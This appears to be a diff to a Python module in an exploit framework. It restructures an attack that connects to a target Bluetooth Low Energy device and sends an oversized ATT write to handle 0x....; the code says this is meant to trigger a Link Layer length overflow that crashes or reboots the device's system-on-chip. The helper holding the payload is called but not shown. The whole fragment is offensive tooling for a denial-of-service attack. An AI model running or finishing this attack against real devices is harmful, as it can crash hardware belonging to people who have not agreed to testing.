@@ -168,11 +168,24 @@ class Exploit(Exploit):
             print_error("bleak not installed: pip install bleak")
             return
 
-        print_status(f"Attacking {target_addr} (ATT handle 0x{att_handle_val:04X})...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: BLE LL length overflow via oversized ATT write."""
+        target_addr = str(self.target).strip()
+        att_handle_val = int(self.att_handle)
+
+        print_status(f"Phase 1: Connecting to {target_addr} ...")
+        print_status(f"Phase 2: Sending oversized ATT write to handle 0x{att_handle_val:04X} ...")
+
         try:
             result = asyncio.run(_run_length_overflow_attack(target_addr, att_handle_val))
             if result:
-                print_success("Attack sent. Check if target device crashed/rebooted.")
+                print_success(
+                    f"Oversized ATT write delivered to {target_addr}. "
+                    "If the SoC BLE stack is vulnerable, the device should "
+                    "crash or reboot due to LL length overflow."
+                )
             else:
                 print_error("Attack failed. Verify BLE adapter and target proximity.")
         except RuntimeError:
